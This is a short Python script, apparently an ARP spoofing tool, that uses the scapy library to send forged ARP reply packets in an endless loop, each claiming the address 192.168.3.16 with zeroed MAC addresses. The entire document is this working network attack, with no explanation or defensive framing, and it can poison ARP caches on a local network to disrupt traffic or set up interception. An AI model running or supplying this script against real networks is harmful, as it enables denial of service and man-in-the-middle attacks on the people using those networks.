from scapy.all import *

while True:
    sendp(Ether(src='00:00:00:00:00:00', dst='00:00:00:00:00:00')/ARP(op=2, hwsrc='00:00:00:00:00:00', psrc='192.168.3.16', hwdst='00:00:00:00:00:00', pdst='192.168.3.16'))